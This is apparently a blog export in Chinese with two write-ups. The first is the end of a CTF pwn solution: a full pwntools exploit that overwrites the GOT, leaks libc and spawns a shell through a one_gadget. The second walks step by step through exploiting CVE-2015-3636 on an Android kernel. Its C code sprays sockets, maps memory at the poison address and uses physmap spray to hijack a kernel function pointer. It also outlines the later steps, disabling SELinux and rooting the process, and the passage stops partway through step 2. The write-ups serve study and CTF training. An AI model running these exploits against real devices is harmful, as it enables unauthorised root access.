改exit的got表项，让下次循环进入start函数，触发`setbuf(stderr)`，即`puts(snprintf_got)`\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); only handle 15 char\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\n# gdb.attach(myio,\"b *0x40132b \\n c\")  # 2nd scanf\n# gdb.attach(myio,\"b *0x401379 \\n c\")  # setbuf\n\npayload1 = p64(0x401256)[:-1]    # return main\naaw(0x404058,payload1)      # exit_got: 0x404058\n\n# set stderr ,set setbuf_got\naaw(0x4040a0,p64(0x404030)[:-1])   # change: 0x4040a0 —▸ 0x404030 —▸ 0x7f90a4f14d60 (snprintf)\naaw(0x40401f,\"\\x00\\xd0\\x10\\x40\\x00\\x00\\x00\\x00\")                    #  让地址0x404020处为0x4010d0，往前偏移1字节写入\n\n# to exec setbuf(stderr) = puts(snprintf_got)\npayload1 = p64(0x401170)[:-1]    # return start \naaw(0x404058,payload1)      # exit_got: 0x404058\n\nmyio.recvline()\t\t\t# puts(stdin)\nmyio.recvline()\t\t\t# puts(stdout)\nlibc_snprintf = u64(myio.recvline()[:-1].ljust(8,b\"\\x00\"))\t\t# puts(snprintf_got)\nlibc_base = libc_snprintf - 0x61d60\nprint(hex(libc_base))\n\nmyio.interactive()\n```\n\n\n\n## get shell\n\n有了libc地址，一切就变得简单了。只需要把exit的got表项内容改成one_gadget地址，退出main函数时就能get shell啦。本题有如下三条one_gadget。\n\n```bash\n$ one_gadget ./lib/libc.so.6   \n0xe3afe execve(\"/bin/sh\", r15, r12)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [r12] == NULL || r12 == NULL\n\n0xe3b01 execve(\"/bin/sh\", r15, rdx)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xe3b04 execve(\"/bin/sh\", rsi, rdx)\nconstraints:\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n```\n\n调试查看最后一次scanf时的寄存器情况，如下。这里我选择0xe3b01这条gadget。\n\n```bash\n RAX  0x0\n RBX  0x401390 ◂— endbr64 \n RCX  0x0\n*RDX  0x5555562a3320 ◂— 0x0\n*RDI  0x7ffd7a2b3ec8 ◂— 0x61616173243925 /* '%9$saaa' */\n*RSI  0x5555562a3320 ◂— 0x0\n R8   0xffffffff\n*R9   0x7ffd7a2b3d50 ◂— 0x0\n R10  0x40202e ◂— 0x4c3b031b010073 /* 's' */\n*R11  0x7ffd7a2b3ed0 ◂— '9$saaabbX@@'\n R12  0x401170 ◂— endbr64 \n R13  0x7ffd7a2b41b8 ◂— 0x1c\n R14  0x0\n R15  0x0\n*RBP  0x7ffd7a2b3ef0 ◂— 0x0\n*RSP  0x7ffd7a2b3ec0 ◂— 0xffffffff\n RIP  0x40132b ◂— call   0x401140\n```\n\n完整exp如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); only handle 15 char\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\n# gdb.attach(myio,\"b *0x40132b \\n c\")  # 2nd scanf\n# gdb.attach(myio,\"b *0x401379 \\n c\")  # setbuf\n\npayload1 = p64(0x401256)[:-1]    # return main\naaw(0x404058,payload1)      # exit_got: 0x404058\n\n# set stderr ,set setbuf_got\naaw(0x4040a0,p64(0x404030)[:-1])   # change: 0x4040a0 —▸ 0x404030 —▸ 0x7f90a4f14d60 (snprintf)\naaw(0x40401f,\"\\x00\\xd0\\x10\\x40\\x00\\x00\\x00\\x00\")                    #  让地址0x404020处为0x4010d0，往前偏移1字节写入\n\n# to exec setbuf(stderr) = puts(snprintf_got)\npayload1 = p64(0x401170)[:-1]    # return start \naaw(0x404058,payload1)      # exit_got: 0x404058\n\nmyio.recvline()\t\t\t# puts(stdin)\nmyio.recvline()\t\t\t# puts(stdout)\nlibc_snprintf = u64(myio.recvline()[:-1].ljust(8,b\"\\x00\"))\t\t# puts(snprintf_got)\nlibc_base = libc_snprintf - 0x61d60\nprint(hex(libc_base))\n\npayload1 = p64(libc_base+0xe3b01)[:-1]    # exec /bin/sh\naaw(0x404058,payload1)      # exit_got: 0x404058\n\nmyio.interactive()\n```\n\n## 思考\n\n- 任意地址写的时候，一定要观察写入的地址附近，是否有写超过了的情况\n- 写got表时，碰到含\"\\x20\"等特殊字符的地址时，可以考虑偏移一个字节/几个字节写入\n\n- pwn题替换ld和libc进行调试的方法：\n\n  1. 使用gdb，参考[How to use a different ld-linux.so?](https://groups.google.com/g/gnu.gcc.help/c/EQyHkCF5QGo?pli=1)\n\n     ```bash\n     $ gdb ./lib/ld-2.31.so\n     (gdb) run --library-path ./lib ./bin/chall\n     ```\n\n  2. patch elf，参考[加载libc](https://xz.aliyun.com/t/6260)\n\n  3. 使用pwntools python脚本\n\n     ```python\n     myelf = ELF(\"./bin/chall\")\n     mylibc = ELF(\"./lib/libc.so.6\")\n     myld = ELF(\"./lib/ld-2.31.so\")\n     myio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n     \n     gdb.attach(myio,\"b *0x40132b \\n c\")  \n     ```\n\n     上面这种方法只能断在main后，想断在main前，需要使用`gdb.debug(\"xxx\",\"b *0xaaaa \\n c\")`（这种方法下，如果要指定libc和ld的话，得先通过patch elf改掉libc和ld的路径）。参考：[使用pwntools+gdb下断点到main函数前](https://blog.csdn.net/fjh1997/article/details/105434992)\n\n\n\n\n\n","tags":["pwn"],"categories":["CTF"]},{"title":"一步一步利用 CVE-2015-3636","url":"/2022/09/21/cve-2015-3636-52pojie-version/","content":"\n\n\nCVE-2015-3636漏洞的杀伤力巨大，能够root当时大多数的android手机（[这些年, 我们虐过的漏洞by 腾讯科恩实验室](https://keenlab.tencent.com/zh/2016/05/25/CVEs-in-KeenLab/)）。科恩团队利用改进过的fuzz工具 [Trinity](https://github.com/kernelslacker/trinity) 发现了该漏洞，并在blackhat 2015通过议题 [Own your Android! Yet Another Universal Root](https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf) 详细讲述了该漏洞的利用方法。\n\n该漏洞发生在内核网络协议栈网络层的实现中（ping_unhash()），client端向服务器端发起连接（connect()函数）操作时，未考虑到hlist_nulls_node节点删除的特殊性（node->pprev不为null，而是LIST_POISON2），从而导致了UAF漏洞。\n\n被free的对象是[struct socket](https://elixir.bootlin.com/linux/v3.10/source/include/linux/net.h#L104)中的struct sock *sk，[sock结构体](https://elixir.bootlin.com/linux/v3.10/source/include/net/sock.h#L285)中有许多函数指针。因此通过physmap spray覆盖某个函数指针，来达到任意代码执行的目的，进而获取root shell。\n\n# 环境准备\n\n根据[吾爱破解2016安全挑战赛](https://www.52pojie.cn/thread-480759-1-1.html)中给出的漏洞环境，准备如下两个镜像：\n\n- [ubuntu14.04镜像](https://mirrors.aliyun.com/ubuntu-releases/14.04/ubuntu-14.04.6-desktop-amd64.iso?spm=a2c6h.25603864.0.0.10af5192cdIhXU)\n\n- [goldfish镜像及对应emulator](http://down.52pojie.cn/Challenge/2016_Security_Challenge/android-problem-env.7z) - 解压密码：63BBC624A1238F6434B37EEAA4535D6C\n\n该题中linux内核的版本是3.10，下载源码辅助分析：[linux v3.10-rc1版本源码](https://github.com/torvalds/linux/tree/v3.10-rc1)\n\n分析之前，先用别人的poc和exp打一遍，确认环境和利用脚本都没问题。\n\n## 测试poc\n\n> poc部分仅仅体现了访问非法地址导致的崩溃，真正的利用需要绕过崩溃点，触发UAF，然后在关闭socket时劫持控制流\n\n[poc代码-ndk编译](poc.zip) ，main函数代码如下：\n\n```c\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n    struct sockaddr_in sa;\n    memset(&sa, 0, sizeof(sa));\n    sa.sin_family = AF_INET;\n    connect(sock, (const struct sockaddr *) &sa, sizeof(sa));\n    \n    sa.sin_family = AF_UNSPEC;\n    connect(sock, (const struct sockaddr *) &sa, sizeof(sa));\n    connect(sock, (const struct sockaddr *) &sa, sizeof(sa));\n```\n\n执行poc后，kernel panic，显示`Unable to handle kernel paging request at virtual address 00001360`，为什么不是0x200200呢？这是因为出题人对这个值做了修改，利用IDA逆向Image文件，在`sub_FFFFFFC000409614()`函数中可以看到0x1360这个值。\n\n![image-20220724205457823](image-20220724205457823.png?size=600)\n\n![image-20220724205518889](image-20220724205518889.png?size=600)\n\n\n\n## 测试exp\n\n> 比较复杂，在漏洞利用小节详细分析\n\n[看雪2016挑战赛exp.by.4B5F5F4B](https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636/jni)\n\nndk编译后能成功执行\n\n![image-20220724134020649](image-20220724134020649.png?size=600)\n\n> LQ：aarch64-gnu-linux-gcc 静态编译和ndk编译的结果不一样（1. 对头文件的依赖；2. system无法执行成功 ；3. mmap操作不一样）【最终有没有可能采用静态编译的方式利用成功？】\n\n\n\n## 如何调试\n\n> 题目给的启动程序做了些封装操作，为了获得最原始的qemu启动命令，需在程序启动后查看进程信息，截取启动命令\n\n`./startEmulator`启动虚拟机后，通过`ps -ef`查看进程情况，得知最终是通过qemu-system-aarch64（是谷歌的android-qemu）来启动的。我们需要利用它的启动参数来调试。\n\n```\nbling     19263   2450  0 21:19 pts/1    00:00:00 /bin/bash ./startEmulator\nbling     19264  19263 98 21:19 pts/1    00:00:09 ./qemu/linux-x86_64/qemu-system-aarch64 -cpu cortex-a57 -machine type=ranchu -m 1024 -append console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0 -serial mon:stdio -kernel ./Image -initrd...\n```\n\n由于启动命令较长，terminal无法完全显示命令。我们可以利用cmdline获取该命令，如下：\n\n```shell\ncat /proc/<PID>/cmdline | xargs -0 echo\n# 或者\npython3 -c \"print(open('/proc/8716/cmdline','rb').read().replace(b'\\x00',b' '))\"\n```\n\n得到如下启动命令\n\n```shell\n./qemu/linux-x86_64/qemu-system-aarch64 -cpu cortex-a57 -machine type=ranchu -m 1024 -append 'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0' -serial mon:stdio -kernel ./Image -initrd ./ramdisk.img -drive index=0,id=sdcard,file=./system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=././userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=./cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=./system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios\n```\n\n调试的话，在以上命令后加上`-S -s`（gdbserver默认监听本地1234端口），然后另起一个terminal，执行`gdb-multiarch`\n\n```shell\n$ gdb-multiarch\ngdb> set architecture aarch64\ngdb> target remote :1234\n# 如果用gef调试的话，必须用命令：gef-remote -q localhost:1234\n# 否则会报错- Command 'context' failed to execute properly, reason: 'NoneType' object has no attribute 'all_registers'\ngdb> c\n\n```\n\n# 漏洞分析\n\n> 该漏洞发生在内核网络协议栈网络层的实现中（ping_unhash()），client端向服务器端发起连接（connect()函数）操作时，未考虑到hlist_nulls_node节点删除的特殊性（node->pprev不为null，而是LIST_POISON2），从而导致了UAF漏洞。\n>\n> 被free的对象是[struct socket](https://elixir.bootlin.com/linux/v3.10/source/include/linux/net.h#L104)中的struct sock *sk，[sock结构体](https://elixir.bootlin.com/linux/v3.10/source/include/net/sock.h#L285)中有许多函数指针。因此通过physmap spray覆盖某个函数指针，来达到任意代码执行的目的，进而获取root shell。\n\n了解linux内核网络协议栈参考：[计算机网络基础 — Linux 内核网络协议栈](https://www.cnblogs.com/jmilkfan-fanguiju/p/12789808.html)\n\n根据poc崩溃现场打印的log来看，调用流程是这样的：Sys_connect() --> inet_dgram_connect() --> udp_disconnect() --> ping_unhash()。跟着源码分析，inet_dgram_connect()函数定义如下：\n\n```c\nint inet_dgram_connect(struct socket *sock, struct sockaddr *uaddr,\n\t\t       int addr_len, int flags)\n{\n\tstruct sock *sk = sock->sk;\n\n\tif (addr_len < sizeof(uaddr->sa_family))\n\t\treturn -EINVAL;\n\tif (uaddr->sa_family == AF_UNSPEC)\n\t\treturn sk->sk_prot->disconnect(sk, flags);\n\n\tif (!inet_sk(sk)->inet_num && inet_autobind(sk))\n\t\treturn -EAGAIN;\n\treturn sk->sk_prot->connect(sk, uaddr, addr_len);\n}\nEXPORT_SYMBOL(inet_dgram_connect);\n```\n\n漏洞分支是`if (uaddr->sa_family == AF_UNSPEC)`，而sk->sk_prot->disconnect对应的函数是谁呢？\n\n> inet_init()中根据实际场景将某个[struct inet_protosw inetsw_array](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/af_inet.c#L1030)关联到inetsw，再在inet_create()函数中初始化sk->sk_prot为对应的`.prot`。本题对应[IPPPROTO_ICMP](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/af_inet.c#L1051)这一结构，如下：\n>\n> ```c\n> static struct inet_protosw inetsw_array[] =\n> {\n>        {\n> \t\t.type =       SOCK_DGRAM,\n> \t\t.protocol =   IPPROTO_ICMP,\n> \t\t.prot =       &ping_prot,\n> \t\t.ops =        &inet_dgram_ops,\n> \t\t.no_check =   UDP_CSUM_DEFAULT,\n> \t\t.flags =      INET_PROTOSW_REUSE,\n>        },\n> ```\n\n因此，sk->sk_prot->disconnect中的disconnect对应[struct proto ping_prot](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/ping.c#L727)中的[udp_disconnect()](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/udp.c#L1306)，代码如下：\n\n```c\nint udp_disconnect(struct sock *sk, int flags)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\t/*\n\t *\t1003.1g - break association.\n\t */\n\n\tsk->sk_state = TCP_CLOSE;\n\tinet->inet_daddr = 0;\n\tinet->inet_dport = 0;\n\tsock_rps_reset_rxhash(sk);\n\tsk->sk_bound_dev_if = 0;\n\tif (!(sk->sk_userlocks & SOCK_BINDADDR_LOCK))\n\t\tinet_reset_saddr(sk);\n\n\tif (!(sk->sk_userlocks & SOCK_BINDPORT_LOCK)) {\n\t\tsk->sk_prot->unhash(sk);\n\t\tinet->inet_sport = 0;\n\t}\n\tsk_dst_reset(sk);\n\treturn 0;\n}\nEXPORT_SYMBOL(udp_disconnect);\n```\n\n如果当前未绑定端口，则进入`if (!(sk->sk_userlocks & SOCK_BINDPORT_LOCK))`分支，调用`sk->sk_prot->unhash(sk)`，对应[ping_v4_unhash()](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/ping.c#L135)函数（函数名跟题目Image中的不一样），函数定义如下：\n\n```c\nstatic void ping_v4_unhash(struct sock *sk)\n{\n\tstruct inet_sock *isk = inet_sk(sk);\n\tpr_debug(\"ping_v4_unhash(isk=%p,isk->num=%u)\\n\", isk, isk->inet_num);\n\tif (sk_hashed(sk)) {\n\t\twrite_lock_bh(&ping_table.lock);\n\t\thlist_nulls_del(&sk->sk_nulls_node);\n\t\tsock_put(sk);\n\t\tisk->inet_num = 0;\n\t\tisk->inet_sport = 0;\n\t\tsock_prot_inuse_add(sock_net(sk), sk->sk_prot, -1);\n\t\twrite_unlock_bh(&ping_table.lock);\n\t}\n}\n```\n\nif分支的判断条件是`sk_hashed(sk)`，简言之，如果`sk->sk_node->pprev`非0，就进入if分支。下面看看if分支里的`hlist_nulls_del()`函数，将`sk->sk_nulls_node`从链表节点中删除，并将`sk->sk_nulls_node->pprev`设置为`LIST_POISON2`（0x200200，本题环境中为0x1360）。\n\n`sk->sk_nulls_node`即`sk->sk_node`，它俩是一个union。\n\n```c\n# define POISON_POINTER_DELTA 0\n/*\n * These are non-NULL pointers that will result in page faults\n * under normal circumstances, used to verify that nobody uses\n * non-initialized list entries.\n */\n#define LIST_POISON1  ((void *) 0x00100100 + POISON_POINTER_DELTA)\n#define LIST_POISON2  ((void *) 0x00200200 + POISON_POINTER_DELTA)\n\nstatic inline void hlist_nulls_del(struct hlist_nulls_node *n)\n{\n\t__hlist_nulls_del(n);\n\tn->pprev = LIST_POISON2;\n}\n\nstatic inline void __hlist_nulls_del(struct hlist_nulls_node *n)\n{\n\tstruct hlist_nulls_node *next = n->next;\n\tstruct hlist_nulls_node **pprev = n->pprev;\n\t*pprev = next;\n\tif (!is_a_nulls(next))\n\t\tnext->pprev = pprev;\n}\n```\n\n关于链表删除时为什么将`node->pprev`赋值为`LIST_POISON2`，文章 [linux双向链表分析之list_del中的技巧](https://blog.csdn.net/z2007b/article/details/6370383) 中说是为了方便调试的目的。\n\n`hlist_nulls_del()`后是`sock_put()`，该函数在sk无引用后，调用`sk_free()`释放sk节点。\n\n```c\nstatic inline void sock_put(struct sock *sk)\n{\n\tif (atomic_dec_and_test(&sk->sk_refcnt))\n\t\tsk_free(sk);\n}\n// 调试显示，第一次指定“sa.sin_family = AF_UNSPEC”调用connect(sock, (const struct sockaddr *) &sa, sizeof(sa))时，sk->sk_refcnt的值为2，不会进入sk_free。\n// 第二次调用connect进入该分支时，（mmap 0x200200/0x1360 后），sk->sk_refcnt为1，将进入sk_free()流程\n```\n\n以上流程走第一遍的时候没什么问题，但走第二遍时，由于`sk->sk_node->pprev`为非零值（0x200200/0x1360），因此会进入`if(sk_hashed(sk))`分支，然后顺序执行`hlist_nulls_del(&sk->sk_nulls_node)` 和 `sock_put(sk)`。当执行到如下代码片段时，由于`n->pprev`为`0x200200/0x1360`，导致`*pprev = next`发生非法地址访问，内核crash。\n\n```c\nstatic inline void __hlist_nulls_del(struct hlist_nulls_node *n)\n{\n\tstruct hlist_nulls_node *next = n->next;\n\tstruct hlist_nulls_node **pprev = n->pprev;\n\t*pprev = next;\n```\n\n如果在访问该非法地址前，先合法映射`0x200200/0x1360`这块地址区域，就不会在此处发生内核crash。然后，会继续执行`sock_put(sk)`，此时`sk->sk_refcnt`为1（调试发现），因此会执行`sk_free(sk)`操作。虽然`sk`已释放，但用户态依然可以通过已打开的socket文件描述符访问`sk`中的数据，于是产生了UAF。\n\n[漏洞patch](https://github.com/torvalds/linux/commit/a134f083e79fb4c3d0a925691e732c56911b4326?diff=split) 在删除链表节点和释放sk函数之间新增了一个函数`sk_nulls_node_init`，将`sk->sk_node->pprev`置为0，则无法二次进入`if (sk_hashed(sk))`分支触发UAF。\n\n```c\n/*\t\thlist_nulls_del(&sk->sk_nulls_node);\n\t\tsk_nulls_node_init(&sk->sk_nulls_node);\n\t\tsock_put(sk);\t\t*/\n\nstatic inline void sk_nulls_node_init(struct hlist_nulls_node *node)\n{\n\tnode->pprev = NULL;\n}\n```\n\n\n\n# 漏洞利用\n\n## 总体思路\n\n利用思路分为如下6个步骤：\n\n1、**physmap spray**：劫持函数指针`sk->_sk_common->skc_prot->close`\n\n> - 内核态堆内存：用户态创建大量socket连接，利用漏洞产生kmalloc UAF\n> - 用户态mmap内存：mmap大量内存，并以页为单位进行标记\n> - 两者在物理内存中可能存在重叠，因此重点变成了，如何找到mmap page与socket的重合呢？\n> - socket有一个特殊的ioctl cmd，叫SIOCGSTAMPNS。它将返回sk->偏移0x1D8处的值。于是，只要在mmap时为每个PAGE做特殊标记，便能定位到哪些mmap page和socket会重合。\n> - 而close(fd)时会用到sk->偏移0x28处的函数指针，因此改目标mmap_page其偏移0x28处的值，就能实现内核控制流劫持了！\n\n2、**改进程addr_limit**：任意内核地址读写\n\n>- kernel_setsockopt()函数，控制跳过setfs(oldfs)这行代码。\n>- 使用pipe系统调用，对任意内核地址读写\n\n3、**关闭selinux**：利用任意内核读写来关闭selinux\n\n4、**获取cred/real_cred地址**\n\n> - 泄露当前进程task_struct结构体的地址\n> - 根据cred/real_cred在task_struct中的偏移，获取cred/real_cred结构体的地址\n\n5、**进程提权**\n\n> - 将cred结构体中uid,gid,suid,sgid,euid,egid,fsuid,fsgid全部置零\n\n6、**稳定shell**\n\n## 步骤1. physmap spray\n\n- UAF socket spray\n\n  由于需要创建大量socket，因此首先改掉linux rlimit对打开文件数量的限制，即RLIMIT_NOFILE（能打开的文件数目）。\n\n  ```c\n  int maximize_fd_limit()\n  {\n  \tstruct rlimit rlim;\n  \tint ret;\n  \t\n  \tret = getrlimit(RLIMIT_NOFILE, &rlim);\n  \t//printf(\"rlim.rlim_cur: 0x%x, rlim.rlim_max:0x%x\\n\",rlim.rlim_cur,rlim.rlim_max);\n  \n  \trlim.rlim_cur = rlim.rlim_max;\n  \tsetrlimit(RLIMIT_NOFILE, &rlim);\n  \n  \tret = getrlimit(RLIMIT_NOFILE, &rlim);\n  \treturn rlim.rlim_cur;\n  }\n  ```\n\n  然后申请socket，并调用两次connect产生UAF。需要绕过POC中非法地址访问（真实场景中时0x200200，本题中是0x1360），将该地址做一次映射即可。\n\n  ```c\n  //global \t\n  #define MAX_VULTRIG_SOCKS_COUNT           4000\n  int   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];\n  //global \n  \n  \tint i;\t// for-loop\n  \n  \tstruct sockaddr_in addr1;\n  \tstruct sockaddr_in addr2;\n  \tmemset(&addr1,0,sizeof(addr1));\n  \tmemset(&addr2,0,sizeof(addr2));\n  \taddr1.sin_family = AF_INET;\n  \taddr2.sin_family = AF_UNSPEC;\n  \n  \tprintf(\"[+] set RLIMIT_NOFILE\\n\");\n  \tmaximize_fd_limit();\n  \n  \tprintf(\"[+] socket prepare...\\n\");\n  \tfor(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)\n  \t{\n  \t\tvultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n  \t\tconnect(vultrig_socks[i], &addr1, sizeof(addr1));\n  \t}\n  \n  \t// avoid error: Unable to handle kernel paging request at virtual address 00001360\n  \tprintf(\"[+] mmap 0x1000-0x2000...\\n\");\n  \tsystem(\"echo 4096 > /proc/sys/vm/mmap_min_addr\");\n  \tvoid* user_mm = mmap((void *)0x1000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);\n  \tmemset((char *)user_mm,0x90,0x1000);\n  \n  \tprintf(\"[+] generate vuln sockets...\\n\");\n  \tfor(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)\n  \t{\n  \t\tconnect(vultrig_socks[i], &addr2, sizeof(addr2));\n  \t\tconnect(vultrig_socks[i], &addr2, sizeof(addr2));\n  \t}\n  ```\n\n- mmap spray\n\n  考虑到性能，将mmap的size设置得尽量大。经过测试，一次mmap `150*1024*1024`大小是可以的。\n\n  应当如何给mmap_page做标记呢？取决于使用socket的何种特性。\n\n  `struct sock`结构体中有一个成员`ktime_t sk_stamp`，用户态可以通过`struct timespec time;  ioctl(exp_sock, SIOCGSTAMPNS, &time)`读取到它的转换结果。64位系统下调用过程见《socket的inet_ioctl》章节内容。\n\n  通过分析题目的Image镜像，确定sk->sk_stamp的偏移是0x1D8。\n\n  ```c\n  __int64 __fastcall sock_get_timestampns(__int64 a1, _QWORD *a2)\n  {\n    __int64 v4; // x0\n    __int64 v5; // x1\n    __int64 result; // x0\n    __int64 real; // x0\n    __int64 v10; // x1\n    __int64 v11; // [xsp+0h] [xbp+0h] BYREF\n    __int64 v12; // [xsp+20h] [xbp+20h] BYREF\n    __int64 v13; // [xsp+28h] [xbp+28h]\n  \n    if ( (*(_QWORD *)(a1 + 200) & 0x80) == 0 )\n      sock_enable_timestamp(a1, 7i64);\n    v4 = ns_to_timespec(*(_QWORD *)(a1 + 0x1D8));\n  ```\n\n  因此，我们在mmap的每一个mmap_page中，偏移0x1D8的位置，写入一个8字节的magic number。代码如下：\n\n  ```c\n  // global\n  #define PAGE_SIZE\t\t\t  4096\n  #define MAGIC_VALUE \t\t\t  0x4B5F5F4B\n  #define MAX_PHYSMAP_SIZE                  120*1024*1024\n  #define MAX_PHYSMAP_SPRAY_PROCESS         5\n  \n  void* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];\n  int   physmap_spray_pages_count;\n  // global\n  \n  int physmap_spray_func(){\n  \tvoid* mapped;\n  \tvoid* mapped_page;\n  \tint i,j;\n  \n  \tmemset(physmap_spray_pages,0,sizeof(physmap_spray_pages));\n  \tphysmap_spray_pages_count = 0;\n  \n  \tfor(i = 0; i < MAX_PHYSMAP_SPRAY_PROCESS; i++){\n  \t\tmapped = mmap(NULL, MAX_PHYSMAP_SIZE , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);\n  \t\tmemset((char *)mapped,0x41,MAX_PHYSMAP_SIZE);\n  \n  \t\tfor(j = 0; j < MAX_PHYSMAP_SIZE/PAGE_SIZE; j++){\n  \t\t\tmapped_page = (void*)((char*)mapped + PAGE_SIZE*j);\n  \t\t\t*(unsigned long *)((char*)mapped_page+0x1D8) = MAGIC_VALUE + physmap_spray_pages_count;\n  \t\t\tphysmap_spray_pages[physmap_spray_pages_count] = mapped_page;\n  \t\t\tphysmap_spray_pages_count++;\n  \t\t}\n  \t}\n  \treturn 0;\n  }\n  ```\n\n- find exploitable socket and mmap_page\n\n  对每一个socket，遍历mmap_page，找到timestamp一致的两个对象。\n\n  ```c\n  int search_exploitable_socket(int* index, void** payload)\n  {\n      struct    timespec time;\n      uint64_t  value;\n      void*     page     =  NULL;\n      int       j        =  0;\n      int       exp_sock = -1;\n      int       got      =  0;\n  \n      do{\n          exp_sock = vultrig_socks[*index];\n          memset(&time, 0, sizeof(time));\n          ioctl(exp_sock, SIOCGSTAMPNS, &time);\n          value = ((uint64_t)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;\n  \n          for(j = 0; j < physmap_spray_pages_count; j++){\n              page = physmap_spray_pages[j];\n              if(value == *(unsigned long *)((char *)page + 0x1D8)){\n                  printf(\"[*] magic:%p\\n\", value);\n                  got = 1;\n                  *payload = page;\n  \t\t\t\tprintf(\"hit the mmap page : 0x%x\\n\",j);\n                  break;\n              }\n          }\n          *index = *index + 1;\n      }while(!got && *index < MAX_VULTRIG_SOCKS_COUNT);\n  \n      if(got == 0){\n          return -1;\n      }\n      else{\n          return exp_sock;\n      }\n  }\n  \n  \n  //调用\n  \tint exp_sock,exp_sock_index;\n  \tvoid* payload;\n  \n  \texp_sock_index = 0;\n  \texp_sock = search_exploitable_socket(&exp_sock_index,&payload);\n  \tif(exp_sock == -1){\n  \t\tprintf(\"cannot find target socket\\n\");\n  \t}else{\n  \t\tprintf(\"find it 1!!! exp_sock_index: 0x%x\\n\",exp_sock_index);\n  \t}\n  ```\n\n  \n\n- hijack `sk->sk_prot->close`\n\n  `struct sock`结构体中有许多函数指针，其中`sk->sk_prot->close`在`close(fd)`时会通过`sock_close()` -> `sock_release()` -> `inet_release()`调用到。\n\n  ```c\n  struct sock {\n  \t/*\n  \t * Now struct inet_timewait_sock also uses sock_common, so please just\n  \t * don't add nothing before this first member (__sk_common) --acme\n  \t */\n  \tstruct sock_common\t__sk_common;\n  \t#define sk_prot\t\t\t__sk_common.skc_prot\n  \t//......\n  }\n  \n  struct sock_common {\n  \t//......\n  \tstruct proto\t\t*skc_prot;\n  \t//......\n  }\n  \t\n  struct proto {\n  \tvoid\t\t\t(*close)(struct sock *sk,\n  \t\t\t\t\tlong timeout);\n  \tint\t\t\t(*connect)(struct sock *sk,\n  \t\t\t\t\tstruct sockaddr *uaddr,\n  \t\t\t\t\tint addr_len);\n  \t//.......\n  }\n  ```\n\n  inet_release函数中，`sk->sk_prot->close(sk, timeout)`对应的汇编代码如下，`sk->sk_prot->close`中sk_prot（即__sk_common.skc_prot）距离sock起始地址的偏移量是0x28。从该地址取出的值即close()函数起始地址。\n\n  ```assembly\n  ROM:FFFFFFC0003FEA20 loc_FFFFFFC0003FEA20                    ; CODE XREF: inet_release+90↓j\n  ROM:FFFFFFC0003FEA20                                         ; inet_release+98↓j\n  ROM:FFFFFFC0003FEA20                 STR             XZR, [X20,#0x20]\n  ROM:FFFFFFC0003FEA24                 MOV             X0, X19\n  ROM:FFFFFFC0003FEA28                 LDR             X2, [X19,#0x28]\n  ROM:FFFFFFC0003FEA2C                 LDR             X2, [X2]\n  ROM:FFFFFFC0003FEA30                 BLR             X2\n  ```\n\n  因此，上一步骤找到满足条件的socket和mmap_page之后，覆盖mmap_page偏移0x28位置处的8个字节地址指向的内容，就能实现控制流劫持了！\n\n该步骤的源码参考：[步骤1的源码](step1.c)\n\n编译完成后，通过adb push到虚拟机中，执行结果如下图所示，成功劫持pc。\n\n![image-20220918180540313](image-20220918180540313.png?size=600)\n\n\n\n## 步骤2. 改进程addr_limit\n\n- 扩大进程addr limit访问空间\n\n  用户态进程陷入内核态后，通过set_fs(KERNEL_DS)将本进程可访问地址限制设为0xFFFFFFFFFFFFFFFF，于是当前进程可访问到所有虚拟内存地址。在目标功能完成后，通过set_fs(oldfs)将限制重新设置为原来的大小。它们在内核代码中通常是成对出现的。\n\n  